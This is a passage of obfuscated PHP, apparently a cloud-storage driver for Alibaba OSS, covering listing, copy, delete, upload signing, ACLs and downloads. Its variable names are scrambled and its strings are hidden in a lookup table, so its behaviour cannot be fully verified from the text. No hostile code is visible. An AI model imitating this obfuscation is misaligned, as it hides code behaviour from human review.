$_SERVER[ë¦»ºéÌ]; $—Ä’ùÁ‚ = null; try { $—Ä’ùÁ‚ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $¼½•¼Ôš) { return null; } if (!$—Ä’ùÁ‚ || !($‘ôâ÷â¦ = $—Ä’ùÁ‚->getRules())) { return null; } $éŠÅê‰— = $‘ôâ÷â¦[0]->getAllowedOrigins(); $¬ò›ê¼Õ = $‘ôâ÷â¦[0]->getAllowedMethods(); $´é¢øµ­ = $‘ôâ÷â¦[0]->getMaxAgeSeconds(); $ÈÑœé­ = $‘ôâ÷â¦[0]->getExposeHeaders(); $Ù·¾Ú·³ = $‘ôâ÷â¦[0]->getAllowedHeaders(); return array($òÈ«Èè»[192] => isset($éŠÅê‰—[0]) ? $éŠÅê‰—[0] : $òÈ«Èè»[12], $òÈ«Èè»[196] => $¬ò›ê¼Õ, $òÈ«Èè»[1369] => $´é¢øµ­, $òÈ«Èè»[1370] => isset($ÈÑœé­[0]) ? $ÈÑœé­[0] : $òÈ«Èè»[12], $òÈ«Èè»[194] => isset($Ù·¾Ú·³[0]) ? $Ù·¾Ú·³[0] : $òÈ«Èè»[12]); } public function isBucketCors() { $ÔˆŸƒ¹“ =& $_SERVER[ë¦»ºéÌ]; $ÎÌĞ‡¯ç = $this->getBucketCors(); if (!$ÎÌĞ‡¯ç || !is_array($ÎÌĞ‡¯ç)) { return !1; } if ($ÎÌĞ‡¯ç[$ÔˆŸƒ¹“[192]] != $ÔˆŸƒ¹“[193] || $ÎÌĞ‡¯ç[$ÔˆŸƒ¹“[194]] != $ÔˆŸƒ¹“[193]) { return !1; } $ò¡§‘™ = array_map($ÔˆŸƒ¹“[195], $ÎÌĞ‡¯ç[$ÔˆŸƒ¹“[196]]); if (!is_array($ò¡§‘™)) { $ò¡§‘™ = array(); } $¾™¬Ğä = array($ÔˆŸƒ¹“[197], $ÔˆŸƒ¹“[198], $ÔˆŸƒ¹“[199], $ÔˆŸƒ¹“[200], $ÔˆŸƒ¹“[201]); $êöšÄÔ = array_diff($¾™¬Ğä, $ò¡§‘™); return empty($êöšÄÔ); } public function mkfile($øÙì”á, $¦Ã°Ëş§ = '', $Ù¿¶´ô¸ = REPEAT_RENAME) { $´÷®ìçÔ = $this->setContent($øÙì”á, $¦Ã°Ëş§); if ($´÷®ìçÔ !== !1) { return $this->getPathOuter($øÙì”á); } return !1; } public function mkdir($şÔÔ¿Ë‰, $ÎòÍö©² = REPEAT_SKIP) { if ($this->_isFolder($şÔÔ¿Ë‰)) { return $this->getPathOuter($şÔÔ¿Ë‰); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($şÔÔ¿Ë‰)); } catch (OSS\Core\OssException $ÈÉİšŠ) { return !1; } return $this->getPathOuter($şÔÔ¿Ë‰); } private function fileList($‰Š¬çå, $®€Õ£ÜÚ = '', $÷ß¨şË— = 0) { $«×ó†ëæ =& $_SERVER[ë¦»ºéÌ]; $‰Š¬çå = trim($‰Š¬çå, $«×ó†ëæ[8]); $Ëä¾òÆø = empty($‰Š¬çå) && $‰Š¬çå !== $«×ó†ëæ[202] ? $«×ó†ëæ[12] : $‰Š¬çå . $«×ó†ëæ[8]; $ß¿Ñ¨’Ò = $«×ó†ëæ[12]; $ˆÛÀ×‹ = 1000; $Ë®Ÿµèî = $this->listItemCache === !1 ? !1 : !0; $¶²ÄÊš = $ğû×©ï– = array(); while (!0) { check_abort(); $ŞË»Æµ = array($«×ó†ëæ[1371] => $®€Õ£ÜÚ, $«×ó†ëæ[1372] => $Ëä¾òÆø, $«×ó†ëæ[1373] => $ˆÛÀ×‹, $«×ó†ëæ[1374] => $ß¿Ñ¨’Ò); try { $“ğı–« = $this->client->listObjects($this->bucket, $ŞË»Æµ); } catch (OSS\Core\OssException $¾ú™ªÛí) { break; } $ß¿Ñ¨’Ò = $“ğı–«->getNextMarker(); $÷€ò„Áç = $“ğı–«->getObjectList(); $š ¿Ÿûñ = $“ğı–«->getPrefixList(); foreach ($÷€ò„Áç as $“úà‰ò¿) { if ($“úà‰ò¿->getKey() == $Ëä¾òÆø) { continue; } $œÏ³·¢ = $“úà‰ò¿->getKey(); $Œ¶„  = $“úà‰ò¿->getSize(); $Âçİ¤Ê = $“úà‰ò¿->getLastModified(); $¤«£©­Ú = $÷ß¨şË— ? array($«×ó†ëæ[42] => $œÏ³·¢, $«×ó†ëæ[90] => $Œ¶„ , $«×ó†ëæ[208] => strtotime($Âçİ¤Ê)) : $œÏ³·¢; $ÍşÜ×¹ = $Œ¶„  == 0 && substr($œÏ³·¢, strlen($œÏ³·¢) - 1, 1) == $«×ó†ëæ[8] ? !0 : !1; if ($Ë®Ÿµèî) { $this->cacheMethod($«×ó†ëæ[210], $œÏ³·¢, $ÍşÜ×¹); $this->cacheMethod($«×ó†ëæ[211], $œÏ³·¢, array($«×ó†ëæ[90] => $Œ¶„ , $«×ó†ëæ[1375] => $Œ¶„ , $«×ó†ëæ[96] => strtotime($Âçİ¤Ê), $«×ó†ëæ[1376] => $Âçİ¤Ê)); } if ($ÍşÜ×¹) { $¶²ÄÊš[] = $œÏ³·¢; continue; } $ğû×©ï–[] = $¤«£©­Ú; } foreach ($š ¿Ÿûñ as $«™„Ìó) { $¶²ÄÊš[] = $«™„Ìó->getPrefix(); if ($Ë®Ÿµèî) { $this->cacheMethod($«×ó†ëæ[210], $œÏ³·¢, !0); } } if ($ß¿Ñ¨’Ò === $«×ó†ëæ[12]) { break; } } if ($Ë®Ÿµèî) { $this->cacheMethod($«×ó†ëæ[210], $‰Š¬çå, !0); } return array($«×ó†ëæ[87] => $¶²ÄÊš, $«×ó†ëæ[86] => $ğû×©ï–); } public function copyFile($›®®é‘ø, $éœˆÙØı) { $İşñîù = $this->size($›®®é‘ø); if ($İşñîù < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $›®®é‘ø, $this->bucket, $this->pathEncode($éœˆÙØı)); } catch (OSS\Core\OssException $´Ñ«è“Ø) { return !1; } return $this->getPathOuter($éœˆÙØı); } $™©úâô = $this->multiCopyObject($›®®é‘ø, $éœˆÙØı, $İşñîù); return $™©úâô ? $this->getPathOuter($éœˆÙØı) : !1; } private function multiCopyObject($İÈ¼çÜ©, $«€¤æÃ–, $Ä´‰¾ŞÍ) { $’Øü˜Ü¼ =& $_SERVER[ë¦»ºéÌ]; try { $†¦Ç¡Î = array(); if ($ê€“¡ã† = $this->hashMd5($İÈ¼çÜ©)) { $†¦Ç¡Î = array(OSS\OssClient::OSS_HEADERS => array($’Øü˜Ü¼[1377] => $ê€“¡ã†)); } $æàÛƒ¹œ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($«€¤æÃ–), $†¦Ç¡Î); $µ”»»é† = 1; $Ö¢õƒï³ = 0; $¯‹Â…Àª = array(); $å°îÎí½ = 1024 * 1024 * 10; $ıáÉÊ« = $this->client->generateMultiuploadParts($Ä´‰¾ŞÍ, $å°îÎí½); foreach ($ıáÉÊ« as $…‚ğ£Æ => $¥´’£åò) { $ÇİƒËèÚ = $Ö¢õƒï³ + (int) $¥´’£åò[$’Øü˜Ü¼[1378]]; $º™…ıæ¹ = (int) $¥´’£åò[$’Øü˜Ü¼[343]] + $ÇİƒËèÚ - 1; $«Ñ“È– = array($’Øü˜Ü¼[1379] => $ÇİƒËèÚ, $’Øü˜Ü¼[1380] => $º™…ıæ¹); $¯‹Â…Àª[] = $this->client->uploadPartCopy($this->bucket, $İÈ¼çÜ©, $this->bucket, $this->pathEncode($«€¤æÃ–), $µ”»»é†, $æàÛƒ¹œ, $«Ñ“È–); $µ”»»é† = $µ”»»é† + 1; } $öÅî–µ = array(); foreach ($¯‹Â…Àª as $…‚ğ£Æ => $ïÔÜ†ÔŒ) { $öÅî–µ[] = array($’Øü˜Ü¼[1381] => $…‚ğ£Æ + 1, $’Øü˜Ü¼[1382] => $ïÔÜ†ÔŒ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($«€¤æÃ–), $æàÛƒ¹œ, $öÅî–µ); } catch (OSS\Core\OssException $î‰ÇÊÓ¼) { return !1; } return !0; } public function moveFile($šĞèÏ¡¤, $ƒÍª‹Õ¤) { if ($this->copyFile($šĞèÏ¡¤, $ƒÍª‹Õ¤)) { $this->remove($šĞèÏ¡¤); return $this->getPathOuter($ƒÍª‹Õ¤); } return !1; } public function delFile($Æ°†ò»Œ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($Æ°†ò»Œ)); } catch (OSS\Core\OssException $¬öœÚÇ´) { return !1; } return !0; } public function delFolder($·›œÈŞÃ) { $™³Úğ’ì =& $_SERVER[ë¦»ºéÌ]; if (!$this->exist($·›œÈŞÃ)) { return !0; } $this->listItemCache = !1; $Ÿù§ñÙğ = $this->fileList($·›œÈŞÃ); $this->listItemCache = !0; $Ü‡µ”ù¾ = trim($·›œÈŞÃ, $™³Úğ’ì[8]) . $™³Úğ’ì[8]; if (!empty($·›œÈŞÃ) && $·›œÈŞÃ !== $™³Úğ’ì[202] && !in_array($Ü‡µ”ù¾, $Ÿù§ñÙğ[$™³Úğ’ì[87]])) { $Ÿù§ñÙğ[$™³Úğ’ì[87]][] = $Ü‡µ”ù¾; } $¸Õ€¹¾À = $this->delByBatch($Ÿù§ñÙğ[$™³Úğ’ì[86]]); if (!$¸Õ€¹¾À) { return !1; } $¸Õ€¹¾À = $this->delByBatch($Ÿù§ñÙğ[$™³Úğ’ì[87]]); if (!$¸Õ€¹¾À) { return !1; } return $this->delFile($Ü‡µ”ù¾); } private function delByBatch($ığĞÈË‡) { foreach (array_chunk($ığĞÈË‡, 1000) as $÷åü‘ş¸) { try { $this->client->deleteObjects($this->bucket, $÷åü‘ş¸); } catch (OSS\Core\OssException $óıúİù¦) { return !1; } } return !0; } public function rename($äÂ…¼†, $§Èê¿ê) { return $this->renameObject($äÂ…¼†, $§Èê¿ê); } private function fileInfo($×Şéøç, $õÜœÌ†º = false, $ò³ÙÒÕí = array()) { $‰Â«ûÎ‹ =& $_SERVER[ë¦»ºéÌ]; $¡™£ú›’ = array($‰Â«ûÎ‹[42] => $this->pathThis($×Şéøç), $‰Â«ûÎ‹[88] => $this->getPathOuter($×Şéøç), $‰Â«ûÎ‹[43] => $‰Â«ûÎ‹[204], $‰Â«ûÎ‹[90] => isset($ò³ÙÒÕí[$‰Â«ûÎ‹[90]]) ? $ò³ÙÒÕí[$‰Â«ûÎ‹[90]] : 0, $‰Â«ûÎ‹[179] => $this->ext($×Şéøç)); if ($õÜœÌ†º) { return $¡™£ú›’; } $¡™£ú›’[$‰Â«ûÎ‹[205]] = $¡™£ú›’[$‰Â«ûÎ‹[96]] = 0; $¡™£ú›’[$‰Â«ûÎ‹[206]] = $¡™£ú›’[$‰Â«ûÎ‹[207]] = !0; if (empty($ò³ÙÒÕí)) { $•Šö­¡ª = $this->objectMeta($×Şéøç); if (!$•Šö­¡ª) { return $¡™£ú›’; } $ò³ÙÒÕí = array($‰Â«ûÎ‹[96] => strtotime($•Šö­¡ª[$‰Â«ûÎ‹[1376]]), $‰Â«ûÎ‹[90] => $•Šö­¡ª[$‰Â«ûÎ‹[1375]] + 0); } if (isset($ò³ÙÒÕí[$‰Â«ûÎ‹[90]])) { $¡™£ú›’[$‰Â«ûÎ‹[90]] = $ò³ÙÒÕí[$‰Â«ûÎ‹[90]]; } if (isset($ò³ÙÒÕí[$‰Â«ûÎ‹[96]])) { $¡™£ú›’[$‰Â«ûÎ‹[96]] = $ò³ÙÒÕí[$‰Â«ûÎ‹[96]]; } if (isset($ò³ÙÒÕí[$‰Â«ûÎ‹[208]]) && !trim($¡™£ú›’[$‰Â«ûÎ‹[96]])) { $¡™£ú›’[$‰Â«ûÎ‹[96]] = $ò³ÙÒÕí[$‰Â«ûÎ‹[208]]; } return $¡™£ú›’; } private function folderInfo($ƒÏáğ¬ö, $ì¿¿ï¡ = false, $Æâì¬¢‚ = array()) { $È°¾ëç =& $_SERVER[ë¦»ºéÌ]; $¸Ö¨ÑõŸ = array($È°¾ëç[42] => $this->pathThis($ƒÏáğ¬ö), $È°¾ëç[88] => $this->getPathOuter($È°¾ëç[8] . $ƒÏáğ¬ö), $È°¾ëç[43] => $È°¾ëç[89]); if ($ì¿¿ï¡) { return $¸Ö¨ÑõŸ; } $¸Ö¨ÑõŸ[$È°¾ëç[205]] = $¸Ö¨ÑõŸ[$È°¾ëç[96]] = 0; $¸Ö¨ÑõŸ[$È°¾ëç[206]] = $¸Ö¨ÑõŸ[$È°¾ëç[207]] = !0; if (empty($Æâì¬¢‚)) { $ƒÏáğ¬ö = rtrim($ƒÏáğ¬ö, $È°¾ëç[8]) . $È°¾ëç[8]; $ê´ÕÁ = $this->objectMeta($ƒÏáğ¬ö); if (!$ê´ÕÁ) { return $¸Ö¨ÑõŸ; } $Æâì¬¢‚ = array($È°¾ëç[205] => $ê´ÕÁ[$È°¾ëç[513]][$È°¾ëç[1383]], $È°¾ëç[96] => strtotime($ê´ÕÁ[$È°¾ëç[1376]])); } if (isset($Æâì¬¢‚[$È°¾ëç[96]])) { $¸Ö¨ÑõŸ[$È°¾ëç[96]] = $Æâì¬¢‚[$È°¾ëç[96]]; } if (isset($Æâì¬¢‚[$È°¾ëç[205]])) { $¸Ö¨ÑõŸ[$È°¾ëç[205]] = $Æâì¬¢‚[$È°¾ëç[205]]; } return $¸Ö¨ÑõŸ; } public function listPath($‡öÌŞ¤¤, $°´ª˜­ = false) { $¯Õç±å =& $_SERVER[ë¦»ºéÌ]; $§–…áÌ© = $this->fileList($‡öÌŞ¤¤, $¯Õç±å[8], !0); foreach ($§–…áÌ©[$¯Õç±å[87]] as $Æ…±« => $—”ªÃ·×) { $§–…áÌ©[$¯Õç±å[87]][$Æ…±«] = $this->folderInfo($—”ªÃ·×, $°´ª˜­, $—”ªÃ·×); } foreach ($§–…áÌ©[$¯Õç±å[86]] as $Æ…±« => $—”ªÃ·×) { $§–…áÌ©[$¯Õç±å[86]][$Æ…±«] = $this->fileInfo($—”ªÃ·×[$¯Õç±å[42]], $°´ª˜­, $—”ªÃ·×); } return $§–…áÌ©; } public function has($¥ş¯ûÙä, $İâ÷ÊÒ” = false, $™å˜©ì = true) { $´€Ì« =& $_SERVER[ë¦»ºéÌ]; $¥ş¯ûÙä = trim($¥ş¯ûÙä, $´€Ì«[8]); $¢±‹ÖŞ = empty($¥ş¯ûÙä) && $¥ş¯ûÙä !== $´€Ì«[202] ? $´€Ì«[12] : $¥ş¯ûÙä . $´€Ì«[8]; $Ûìçëà = $´€Ì«[12]; $Ğòç£ = 500; $ÕòñŠïÂ = $ƒÁÄ®‰– = 0; while (!0) { check_abort(); $ğÚ«½›ó = array($´€Ì«[1371] => $´€Ì«[8], $´€Ì«[1372] => $¢±‹ÖŞ, $´€Ì«[1373] => $Ğòç£, $´€Ì«[1374] => $Ûìçëà); try { $ö´Š¸ÚÒ = $this->client->listObjects($this->bucket, $ğÚ«½›ó); } catch (OSS\Core\OssException $ÛŸ²º§¦) { break; } $Ûìçëà = $ö´Š¸ÚÒ->getNextMarker(); $µ¹²¶«Ì = $ö´Š¸ÚÒ->getObjectList(); $ÖÍ¿…Î¹ = $ö´Š¸ÚÒ->getPrefixList(); if ($İâ÷ÊÒ”) { if (count($µ¹²¶«Ì) > 1 || count($µ¹²¶«Ì) == 1 && $µ¹²¶«Ì[0]->getKey() != $¢±‹ÖŞ) { $ÕòñŠïÂ += count($µ¹²¶«Ì) - 1; } if (!empty($ÖÍ¿…Î¹)) { $ƒÁÄ®‰– += count($ÖÍ¿…Î¹); } if ($Ûìçëà === $´€Ì«[12]) { break; } continue; } if ($™å˜©ì) { if (!empty($µ¹²¶«Ì)) { if (count($µ¹²¶«Ì) > 1 || $µ¹²¶«Ì[0]->getKey() != $¢±‹ÖŞ) { return !0; } } } else { if (!empty($ÖÍ¿…Î¹)) { return !0; } } if ($Ûìçëà === $´€Ì«[12]) { break; } } if ($İâ÷ÊÒ”) { return array($´€Ì«[214] => $ÕòñŠïÂ, $´€Ì«[215] => $ƒÁÄ®‰–); } return !1; } public function listAll($îšıñùÒ) { $éÑ¶¨â• =& $_SERVER[ë¦»ºéÌ]; $¢¨¹¨ä€ = $this->fileList($îšıñùÒ, $éÑ¶¨â•[12], !0); $¨¹­Ì = array(); foreach ($¢¨¹¨ä€[$éÑ¶¨â•[86]] as $Œ†ù¡“Ì) { $¨¹­Ì[$Œ†ù¡“Ì[$éÑ¶¨â•[42]]] = $Œ†ù¡“Ì[$éÑ¶¨â•[90]]; } foreach ($¢¨¹¨ä€[$éÑ¶¨â•[87]] as $Œ†ù¡“Ì) { if (is_string($Œ†ù¡“Ì)) { $¨¹­Ì[$Œ†ù¡“Ì] = 0; } } return $this->listAllFiles($îšıñùÒ, array_keys($¨¹­Ì), $¨¹­Ì); } public function canRead($Ã†¹ù¼·) { $Ë¬­–å³ =& $_SERVER[ë¦»ºéÌ]; $¸‡¦òĞ = $this->pathAcl($Ã†¹ù¼·); return $¸‡¦òĞ == $Ë¬­–å³[1384] || $¸‡¦òĞ == $Ë¬­–å³[552] ? !0 : !1; } public function canWrite($í¬á¨ß—) { $Ò†÷¢ªá = $this->pathAcl($í¬á¨ß—); return $Ò†÷¢ªá == $_SERVER[ë¦»ºéÌ][552] ? !0 : !1; } public function pathAcl($´ííŞ) { $Ç÷·×úş =& $_SERVER[ë¦»ºéÌ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $‰…ã¾ÏÈ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($´ííŞ)); } catch (OSS\Core\OssException $ÁÏ›ÔË) { return !1; } $ûıö‘¾ô = $‰…ã¾ÏÈ == $Ç÷·×úş[47] ? $this->bucketAcl : $‰…ã¾ÏÈ; if ($ûıö‘¾ô == $Ç÷·×úş[1385]) { return $Ç÷·×úş[1384]; } if ($ûıö‘¾ô == $Ç÷·×úş[1386]) { return $Ç÷·×úş[552]; } return $ûıö‘¾ô; } private function chmodPath($¢ËİÍëş, $øìÒõÈı = '') { $—‰™ğ’” =& $_SERVER[ë¦»ºéÌ]; $Ä§€ş’ğ = empty($øìÒõÈı) ? $—‰™ğ’”[1386] : $øìÒõÈı; $›Ü–šÒˆ = array($—‰™ğ’”[47], $—‰™ğ’”[203], $—‰™ğ’”[1385], $—‰™ğ’”[1386]); if (!in_array($Ä§€ş’ğ, $›Ü–šÒˆ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($¢ËİÍëş), $Ä§€ş’ğ); } catch (OSS\Core\OssException $´û²ïó) { return !1; } return !0; } public function getContent($«×Ğª’ƒ) { return $this->fileSubstr($«×Ğª’ƒ, -1); } public function setContent($é˜”ûğà, $ÄŠß„ñ = '') { $˜¾ğÛı =& $_SERVER[ë¦»ºéÌ]; try { $ıã±òšğ = $this->trafficLimit($˜¾ğÛı[1387]); $öÄÎòÙ‰ = $this->client->putObject($this->bucket, $this->pathEncode($é˜”ûğà), $ÄŠß„ñ, $ıã±òšğ); } catch (OSS\Core\OssException $ƒŸÄƒ»¹) { return !1; } $èË¥öÁ¡ = array($˜¾ğÛı[1377] => trim($öÄÎòÙ‰[$˜¾ğÛı[1388]], $˜¾ğÛı[129]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($é˜”ûğà))); $this->updateObjMeta($é˜”ûğà, $èË¥öÁ¡); return isset($öÄÎòÙ‰[$˜¾ğÛı[1389]][$˜¾ğÛı[1336]]) ? !0 : !1; } private function updateObjMeta($ÛĞáÕ¨, $Öİó½Î‰) { $ÛĞáÕ¨ = $this->pathEncode($ÛĞáÕ¨); try { $µ¹Ûåë = array(OSS\OssClient::OSS_HEADERS => $Öİó½Î‰); $this->client->copyObject($this->bucket, $ÛĞáÕ¨, $this->bucket, $ÛĞáÕ¨, $µ¹Ûåë); } catch (OSS\Core\OssException $Şñ½èÊ) { return !1; } return !0; } public function upload($”Úˆ™é, $ÇñÂ¡ğÈ, $”¾ÙÈ‰ = false, $¿åÄÂâõ = REPEAT_REPLACE) { $š‚…Œé =& $_SERVER[ë¦»ºéÌ]; $•©Àñœ“ = trim($”Úˆ™é, $š‚…Œé[8]); $íüÈ¥€ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($š‚…Œé[1377] => @md5_file($ÇñÂ¡ğÈ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($”Úˆ™é))); $íüÈ¥€ = $this->trafficLimit($š‚…Œé[1387], $íüÈ¥€); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($•©Àñœ“), $ÇñÂ¡ğÈ, $íüÈ¥€); } catch (OSS\Core\OssException $Åşñ©ŒÛ) { return !1; } return $this->getPathOuter($”Úˆ™é); } public function getHost() { $·ñ£§ =& $_SERVER[ë¦»ºéÌ]; $óşªõíø = explode($·ñ£§[188], parent::getHost()); return $óşªõíø[0] . $·ñ£§[188] . $this->bucket . $·ñ£§[10] . $óşªõíø[1]; } public function uploadFormData($Ü¢ÀŒõÒ, $åçàÇ–‡ = 3600) { $óËñÍ¤ =& $_SERVER[ë¦»ºéÌ]; if (!($§›ğ·†Ë = $this->getHost())) { return !1; } $Ïéù¿”Á = $åçàÇ–‡; $é—è¸³Õ = date($óËñÍ¤[1390], time() + $Ïéù¿”Á); $çÄö¼é = new DateTime($é—è¸³Õ); $€³ñÃ”ô = $çÄö¼é->format(DateTime::ISO8601); $¨ÀÊÙì¾ = strpos($€³ñÃ”ô, $óËñÍ¤[302]); $€³ñÃ”ô = substr($€³ñÃ”ô, 0, $¨ÀÊÙì¾) . $óËñÍ¤[1391]; $”œê¡ = 1048576000 * 5; $Ùñíõ¯È = $this->pathFather($Ü¢ÀŒõÒ); $‹ÜŠÎšö = array($óËñÍ¤[1290] => $€³ñÃ”ô, $óËñÍ¤[1291] => array(array($óËñÍ¤[1392], 0, $”œê¡), array($óËñÍ¤[1294], $óËñÍ¤[1295], $Ùñíõ¯È))); $á¥šÂéİ = base64_encode(json_encode($‹ÜŠÎšö)); $¨÷É Éú = base64_encode(hash_hmac($óËñÍ¤[238], $á¥šÂéİ, $this->secret, !0)); $ßëÌ–ó = array($óËñÍ¤[1300] => $á¥šÂéİ, $óËñÍ¤[1393] => $this->accessKey, $óËñÍ¤[1296] => $óËñÍ¤[1288], $óËñÍ¤[1394] => $¨÷É Éú, $óËñÍ¤[186] => $§›ğ·†Ë); $ßëÌ–ó = $this->trafficLimit($óËñÍ¤[1387], $ßëÌ–ó); return $ßëÌ–ó; } public function multiUploadFormData($‘©üÍŞ‡, $ÒÊ ¨î = 3600) { $°åóá¤¶ =& $_SERVER[ë¦»ºéÌ]; if (!($é²Šü×í = $this->getHost())) { return !1; } $äèÑ‚ = $this->trafficLimit($°åóá¤¶[1387]); $Æô¯Ô‰ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($‘©üÍŞ‡), $äèÑ‚); return array($°åóá¤¶[230] => $Æô¯Ô‰, $°åóá¤¶[186] => $é²Šü×í . $°åóá¤¶[8] . $this->pathEncode($‘©üÍŞ‡), $°åóá¤¶[231] => gmdate($°åóá¤¶[1395]), $°åóá¤¶[105] => $‘©üÍŞ‡); } public function multiUploadAuthData($İ±Ÿá½Ö, $­àûİÂ™ = array()) { $Ñè‚¾§– =& $_SERVER[ë¦»ºéÌ]; $‚ô²îÑ¼ = isset($­àûİÂ™[$Ñè‚¾§–[231]]) ? $­àûİÂ™[$Ñè‚¾§–[231]] : gmdate($Ñè‚¾§–[1395]); $ÏÂ¥»±¾ = isset($­àûİÂ™[$Ñè‚¾§–[179]]) ? $­àûİÂ™[$Ñè‚¾§–[179]] : $Ñè‚¾§–[12]; $Âíò‡œ‚ = $İ±Ÿá½Ö; if (isset($­àûİÂ™[$Ñè‚¾§–[105]])) { $Âíò‡œ‚ = $­àûİÂ™[$Ñè‚¾§–[105]]; unset($­àûİÂ™[$Ñè‚¾§–[105]]); } if (isset($­àûİÂ™[$Ñè‚¾§–[232]])) { $­àûİÂ™[$Ñè‚¾§–[231]] = $‚ô²îÑ¼; return $this->listUploadParts($Âíò‡œ‚, $­àûİÂ™); } $›‚«şÀ = array($Ñè‚¾§–[233], $Ñè‚¾§–[12], $Ñè‚¾§–[130], $‚ô²îÑ¼, "\x78\x2d\x6f\x73\163\55\x64\x61\x74\145\72{$‚ô²îÑ¼}", $Ñè‚¾§–[8] . $this->bucket . $Ñè‚¾§–[8] . $Âíò‡œ‚ . $ÏÂ¥»±¾); if (strpos($ÏÂ¥»±¾, $Ñè‚¾§–[234]) === 0) { $›‚«şÀ[0] = $Ñè‚¾§–[235]; if ($ë‚µÏ œ = $this->trafficLimit($Ñè‚¾§–[1387])) { $Âíò‡œ‚ = $Ñè‚¾§–[1396]; array_splice($›‚«şÀ, 5, 0, $Âíò‡œ‚ . $Ñè‚¾§–[4] . $ë‚µÏ œ[$Âíò‡œ‚]); } } if (isset($­àûİÂ™[$Ñè‚¾§–[236]]) && $­àûİÂ™[$Ñè‚¾§–[236]] == $Ñè‚¾§–[237]) { $›‚«şÀ[0] = $Ñè‚¾§–[237]; } if (!empty($­àûİÂ™[$Ñè‚¾§–[1397]])) { $ÉóÇğª– = array_merge(array($›‚«şÀ[4]), $­àûİÂ™[$Ñè‚¾§–[1397]]); sort($ÉóÇğª–); $›‚«şÀ[4] = implode($Ñè‚¾§–[18], $ÉóÇğª–); } $òş‹œ­ = implode($Ñè‚¾§–[18], $›‚«şÀ); $¥‚²‰¸² = base64_encode(hash_hmac($Ñè‚¾§–[238], $òş‹œ­, $this->secret, !0)); $ç‚ÚÁ‡Ó = $Ñè‚¾§–[1361] . $this->accessKey . $Ñè‚¾§–[4] . $¥‚²‰¸²; if (strpos($ÏÂ¥»±¾, $Ñè‚¾§–[234]) === 0) { $ç‚ÚÁ‡Ó = array($Ñè‚¾§–[240] => $ç‚ÚÁ‡Ó, $Ñè‚¾§–[231] => $‚ô²îÑ¼); if ($ë‚µÏ œ) { $ç‚ÚÁ‡Ó = array_merge($ç‚ÚÁ‡Ó, $ë‚µÏ œ); } } return $ç‚ÚÁ‡Ó; } public function listUploadParts($“àÉü©“, $åÄÔ›³») { $÷Úæ¤Ö¿ =& $_SERVER[ë¦»ºéÌ]; $ õÂôéŞ = parse_url_query($åÄÔ›³»[$÷Úæ¤Ö¿[179]]); $ëô½Çˆè = $this->client->listParts($this->bucket, $this->pathEncode($“àÉü©“), $ õÂôéŞ[$÷Úæ¤Ö¿[230]]); $şñãäŸ• = $ëô½Çˆè->getListPart(); $™Ê–‘ = array(); foreach ($şñãäŸ• as $îçÙÔÃ) { $™Ê–‘[] = array($÷Úæ¤Ö¿[1381] => $îçÙÔÃ->getPartNumber(), $÷Úæ¤Ö¿[1382] => trim($îçÙÔÃ->getETag(), $÷Úæ¤Ö¿[129])); } unset($åÄÔ›³»[$÷Úæ¤Ö¿[232]], $åÄÔ›³»[$÷Úæ¤Ö¿[236]]); $ŒÈéÜ´– = $this->multiUploadAuthData($“àÉü©“, $åÄÔ›³»); if (empty($ŒÈéÜ´–)) { return !1; } return array($÷Úæ¤Ö¿[240] => $ŒÈéÜ´–, $÷Úæ¤Ö¿[231] => $åÄÔ›³»[$÷Úæ¤Ö¿[231]], $÷Úæ¤Ö¿[242] => $™Ê–‘); } public function download($“Ñâ×®¼, $µ·ßš‹) { if ($this->isFolder($“Ñâ×®¼)) { return !1; } try { $´§Ë“á– = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $µ·ßš‹); $´§Ë“á– = $this->trafficLimit($_SERVER[ë¦»ºéÌ][120], $´§Ë“á–); $this->client->getObject($this->bucket, $this->pathEncode($“Ñâ×®¼), $´§Ë“á–); } catch (OSS\Core\OssException $«Ñó‰¹) { return !1; } return $µ·ßš‹; } public function fileSubstr($ëêü“‹, $Éí¥½©ú = 0, $Ö¿ØúÊ = false) { if ($Éí¥½©ú === -1) { $‹Ç’”ùæ = array(); } else { if ($Ö¿ØúÊ === !1) { $ı©¼ÛãÉ = $this->size($ëêü“‹); } else { $ı©¼ÛãÉ = $Éí¥½©ú + $Ö¿ØúÊ - 1; } $‹Ç’”ùæ = array(OSS\OssClient::OSS_RANGE => "{$Éí¥½©ú}\55{$ı©¼ÛãÉ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ëêü“‹), $‹Ç’”ùæ); } catch (OSS\Core\OssException $Ğò¶öú) { think_exception($Ğò¶öú->getMessage()); return !1; } } private function trafficLimit($ëÚ…ËäÃ, $µ¥×ˆº = array()) { $éâğá¬ù =& $_SERVER[ë¦»ºéÌ]; if ($ëÚ…ËäÃ == $éâğá¬ù[1387] && $this->isUploadServer() || $ëÚ…ËäÃ == $éâğá¬ù[120] && $this->isFileOutServer()) { return $µ¥×ˆº; } $ ö¡ôÂ© = floatval($GLOBALS[$éâğá¬ù[6]][$éâğá¬ù[100]][$éâğá¬ù[118]][$ëÚ…ËäÃ]) * 1024 * 1024 * 8; if (!$ ö¡ôÂ©) { return $µ¥×ˆº; } $ ö¡ôÂ© = $ ö¡ôÂ© < 819200 ? 819200 : ($ ö¡ôÂ© > 838860800 ? 838860800 : $ ö¡ôÂ©); $µ¥×ˆº[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ ö¡ôÂ©); return $µ¥×ˆº; } public function link($ü€ÁÔú, $·±˜ĞÏ¯ = array()) { $ŞïÌî“¿ =& $_SERVER[ë¦»ºéÌ]; if (!$this->exist($ü€ÁÔú) || $this->isFolder($ü€ÁÔú)) { return !1; } try { $·±˜ĞÏ¯ = $this->trafficLimit($ŞïÌî“¿[120], 